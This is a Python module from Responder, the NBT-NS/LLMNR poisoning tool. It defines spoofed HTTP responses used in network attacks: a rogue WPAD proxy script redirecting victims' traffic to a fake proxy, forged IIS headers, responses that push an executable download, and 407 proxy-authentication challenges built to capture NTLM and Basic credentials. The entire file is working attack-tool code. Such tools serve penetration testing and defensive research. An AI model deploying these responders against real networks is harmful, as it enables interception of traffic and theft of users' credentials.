#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from odict import OrderedDict
from base64 import b64decode,b64encode

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

#WPAD script. the wpadwpadwpad is shorter than 15 chars and unlikely to be found.
class WPADScript(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: application/x-ns-proxy-autoconfig\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "function FindProxyForURL(url, host){return 'PROXY wpadwpadwpad:3141; DIRECT';}"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServerExeFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: application/octet-stream\r\n"),
        ("LastModified",  "Last-Modified: Wed, 24 Nov 2010 00:39:06 GMT\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("Date",          "\r\nDate: Thu, 24 Oct 2013 22:35:46 GMT\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("X-CCC",         "US\r\n"),
        ("X-CID",         "2\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServeAlwaysExeFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: application/octet-stream\r\n"),
        ("LastModified",  "Last-Modified: Wed, 24 Nov 2010 00:39:06 GMT\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentDisp",   "Content-Disposition: attachment; filename="),
        ("ContentDiFile", ""),
        ("FileCRLF",      ";\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("Date",          "\r\nDate: Thu, 24 Oct 2013 22:35:46 GMT\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("X-CCC",         "US\r\n"),
        ("X-CID",         "2\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServeAlwaysNormalFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: text/html\r\n"),
        ("LastModified",  "Last-Modified: Wed, 24 Nov 2010 00:39:06 GMT\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("Date",          "\r\nDate: Thu, 24 Oct 2013 22:35:46 GMT\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("X-CCC",         "US\r\n"),
        ("X-CID",         "2\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

#HTTP Packet used for further NTLM auth.
class IIS_Auth_407_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 407 Authentication Required\r\n"),
        ("Via",           "Via: 1.1 SMB-TOOLKIT\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "Proxy-Authenticate: NTLM\r\n"),
        ("Connection",    "Connection: close \r\n"),
        ("PConnection",   "proxy-Connection: close \r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])

#HTTP NTLM packet.
class IIS_407_NTLM_Challenge_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 407 Authentication Required\r\n"),
        ("Via",           "Via: 1.1 SMB-TOOLKIT\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWWAuth",       "Proxy-Authenticate: NTLM "),
        ("Payload",       ""),
        ("Payload-CRLF",  "\r\n"),
        ("PoweredBy",     "X-Powered-By: SMB-TOOLKIT\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),                                            
    ])

    def calculate(self,payload):
        self.fields["Payload"] = b64encode(payload)

#HTTP Basic answer packet.
class IIS_Basic_407_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "Proxy-Authenticate: Basic realm=\"ISAServer\"\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])
